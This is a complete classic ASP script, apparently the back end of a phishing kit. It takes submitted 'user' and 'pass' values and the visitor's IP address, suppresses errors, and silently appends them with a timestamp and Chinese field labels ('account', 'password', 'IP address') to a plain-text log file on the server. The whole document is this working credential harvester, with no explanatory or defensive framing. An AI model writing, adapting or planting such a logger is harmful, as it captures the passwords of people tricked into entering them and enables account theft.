<%
on error resume next
user=request("user")
pass=request("pass")
ip=Request.ServerVariables("REMOTE_ADDR")
set fs=server.CreateObject("Scripting.FileSystemObject")
set file=fs.OpenTextFile(server.MapPath(".")&"\"&"log"&".txt",8,True)
file.writeline "========================"
file.writeline "时间:"&date&" "&time
file.writeline "帐号:"+user
file.writeline "密码:"+pass
file.writeline "IP地址:"+ip
file.writeline "========================"
file.writeline ""
file.close
set file=nothing
set fs=nothing
%>
